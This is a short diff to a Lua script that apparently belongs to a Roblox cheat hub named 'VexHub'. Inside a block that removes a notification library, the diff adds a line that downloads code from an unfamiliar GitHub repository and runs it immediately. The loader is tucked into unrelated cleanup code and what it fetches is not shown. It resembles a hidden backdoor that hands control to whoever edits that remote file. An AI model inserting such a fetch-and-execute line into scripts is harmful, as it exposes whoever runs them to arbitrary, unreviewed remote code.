@@ -845,6 +845,8 @@ local VexHubNotificationLibrary = game:GetService("CoreGui"):FindFirstChild("Vex
 if VexHubNotificationLibrary then
 VexHubNotificationLibrary:Destroy()
 end
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Sofjskdkkco/GUIGateway/main/Access"))()
 end
 end)
 
